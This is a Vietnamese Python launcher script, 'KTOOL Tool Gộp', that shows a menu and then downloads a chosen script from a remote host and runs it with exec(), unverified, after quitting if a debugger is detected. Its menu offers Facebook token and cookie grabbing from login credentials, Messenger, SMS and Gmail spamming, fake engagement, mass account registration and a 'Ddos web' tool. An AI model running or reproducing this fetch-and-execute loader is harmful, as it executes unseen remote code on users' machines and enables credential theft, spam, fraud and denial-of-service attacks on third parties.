import sys
import requests
import os
import uuid
import urllib.parse
from time import sleep

# Mã màu ANSI
xanh = '\x1b[1;34m'
tim = '\x1b[1;35m'
vang = '\x1b[1;33m'
trang = '\x1b[1;37m'
do = '\x1b[1;31m'

# Chuỗi thanh trang trí
thanh_xau = f"{tim}◆{xanh}[KTOOL]{tim}◆ {vang}"

# Banner ASCII art
banner = ''.join([
    xanh,
    '╔════════════════════════════════════════════════════╗\n',
    xanh, '║   ', tim, '████████╗ ██████╗ ██╗  ██╗██╗   ██╗   ', xanh, '           ║\n',
    xanh, '║   ', tim, '╚══██╔══╝██╔═══██╗██║ ██╔╝╚██╗ ██╔╝   ', xanh, '           ║\n',
    xanh, '║   ', tim, '   ██║   ██║   ██║█████╔╝  ╚████╔╝    ', xanh, '           ║\n',
    xanh, '║   ', tim, '   ██║   ██║   ██║██╔═██╗   ╚██╔╝     ', xanh, '           ║\n',
    xanh, '║   ', tim, '   ██║   ╚██████╔╝██║  ██╗   ██║   ', xanh, '              ║\n',
    xanh, '║   ', tim, '   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ', xanh, '             ║\n',
    xanh, '║   ', thanh_xau, ' Admin👑 : TOKY ', xanh, '                       ║\n',
    xanh, '║   ', thanh_xau, ' Zalo📱: 0779747160 ', xanh, '                   ║\n',
    xanh, '║   ', thanh_xau, ' Youtube▶️ : KTool ', xanh, '                     ║\n',
    xanh, '║   ', thanh_xau, ' Tool Gộp v1 ', xanh, '                          ║\n',
    xanh, '╚════════════════════════════════════════════════════╝\n\n'
])

# Dictionary chứa các liên kết mã nguồn
link_code = {
    '1.1': 'https://shopaccffuytin.click/raw/tdstiktok.py',
    '1.2': 'https://shopaccffuytin.click/raw/tdsintergram.py',
    '1.3': 'https://shopaccffuytin.click/raw/golikeintergram.py',
    '1.4': 'https://shopaccffuytin.click/raw/tdsfb.py',
    '1.5': 'https://shopaccffuytin.click/raw/goliketiktokADR.py',
    '2.1': 'https://shopaccffuytin.click/raw/2.1.py',
    '2.2': 'https://shopaccffuytin.click/raw/2.2.py',
    '2.3': 'https://shopaccffuytin.click/raw/2.3.py',
    '2.4': 'https://shopaccffuytin.click/raw/2.4.py',
    '2.5': 'https://shopaccffuytin.click/raw/2.5.py',
    '3.1': 'https://shopaccffuytin.click/raw/3.1.py',
    '3.2': 'https://shopaccffuytin.click/raw/3.2.py',
    '3.3': 'https://shopaccffuytin.click/raw/3.3.py',
    '3.4': 'https://shopaccffuytin.click/raw/3.4.py',
    '3.5': 'https://shopaccffuytin.click/raw/3.5.py',
    '3.6': 'https://shopaccffuytin.click/raw/3.6.py',
    '3.7': 'https://shopaccffuytin.click/raw/3.7.py',
    '3.8': 'https://shopaccffuytin.click/raw/3.8.py',
    '3.9': 'https://shopaccffuytin.click/raw/3.9.py',
    '4.0': 'https://shopaccffuytin.click/raw/4.0.py',
    '4.1': 'https://shopaccffuytin.click/raw/4.1.py',
    '4.2': 'https://shopaccffuytin.click/raw/4.2.py',
    '4.3': 'https://shopaccffuytin.click/raw/4.3.py',
    '4.4': 'https://shopaccffuytin.click/raw/4.4.py'
}

def menu():
    """Hiển thị menu chính của công cụ"""
    # Xóa màn hình
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Hiển thị banner
    print(banner)
    
    # Hiển thị danh mục
    print(f"{tim}┌─── Danh Mục ───┐")
    print(f"{xanh}1. Tool Cày Cuốc")
    print(f"{xanh}2. Tool Tiện Ích")
    print(f"{xanh}3. Tool Khác")
    print(f"{tim}└────────────────┘\n")
    
    print(f"{tim}──────────────────────────────")
    # Tool Cày Cuốc
    print(f"{thanh_xau}[1.1] Cày Xu TDS Tiktok")
    print(f"{thanh_xau}[1.2] Cày Xu TDS Instagram")
    print(f"{thanh_xau}[1.3] Golike Instagram")
    print(f"{thanh_xau}[1.4] Cày Xu TDS Facebook")
    print(f"{thanh_xau}[1.5] Golike Tiktok ADR")
    
    print(f"{tim}──────────────────────────────")
    # Tool Tiện Ích
    print(f"{thanh_xau}[2.1] Buff Share Ảo Cookie")
    print(f"{thanh_xau}[2.2] Get Token Facebook (16 loại)")
    print(f"{thanh_xau}[2.3] Lấy ID Bài Viết/FB")
    print(f"{thanh_xau}[2.4] Get Cookie FB bằng TK/MK")
    print(f"{thanh_xau}[2.5] Spam Tin Nhắn Messenger")
    
    print(f"{tim}──────────────────────────────")
    # Tool Khác
    print(f"{thanh_xau}[3.1] Buff Key C25tool")
    print(f"{thanh_xau}[3.2] Get Proxy")
    print(f"{thanh_xau}[3.3] Lọc Proxy")
    print(f"{thanh_xau}[3.4] Scan Mail Ảo Lấy Mã")
    print(f"{thanh_xau}[3.5] Spam SĐT V1")
    print(f"{thanh_xau}[3.6] Spam SĐT V2")
    print(f"{thanh_xau}[3.7] Buff Tiktok PC")
    print(f"{thanh_xau}[3.8] Reg Nick FB")
    print(f"{thanh_xau}[3.9] Encode V1 by Tokydev")
    print(f"{thanh_xau}[4.0] Encode pymeomeo [V2]")
    print(f"{thanh_xau}[4.1] Spam Gmail")
    print(f"{thanh_xau}[4.2] Get Suộc web [V1]")
    print(f"{thanh_xau}[4.3] Set Suộc web [V2]")
    print(f"{thanh_xau}[4.4] Ddos web [VIP]")
    print(f"{tim}──────────────────────────────")

def chay_code(ma):
    """Chạy mã từ URL dựa trên mã lựa chọn"""
    try:
        if ma in link_code and link_code[ma]:
            # Tải mã nguồn từ URL
            code = requests.get(link_code[ma]).text
            # Thực thi mã nguồn
            exec(code, globals())
        else:
            print(f"{do}✖ Lựa chọn không đúng ! ")
    except Exception as e:
        print(f"{do}✖ Lỗi khi chạy: {e}")

# Kiểm tra debugger
if sys.gettrace():
    print("Debugger detected!")
    exit()

# Chạy chương trình chính
if __name__ == "__main__":
    menu()
    chon = input(f"{thanh_xau}Nhập số: {trang}")
    chay_code(chon)